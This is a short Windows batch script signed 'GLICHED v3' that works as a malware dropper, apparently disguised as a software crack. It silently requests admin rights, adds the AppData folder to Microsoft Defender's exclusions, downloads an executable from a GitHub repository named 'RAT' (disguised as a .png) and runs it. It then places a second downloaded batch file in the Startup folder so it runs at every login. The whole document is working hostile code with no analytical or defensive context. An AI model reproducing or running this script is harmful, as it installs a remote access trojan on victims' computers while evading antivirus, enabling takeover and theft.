@echo off
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/AuraCreate.bat"
set "AURA_BAT_FILE=%STARTUP_FOLDER%\AuraCreate.bat"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
exit
:: Made by GLICHED 
:: v3
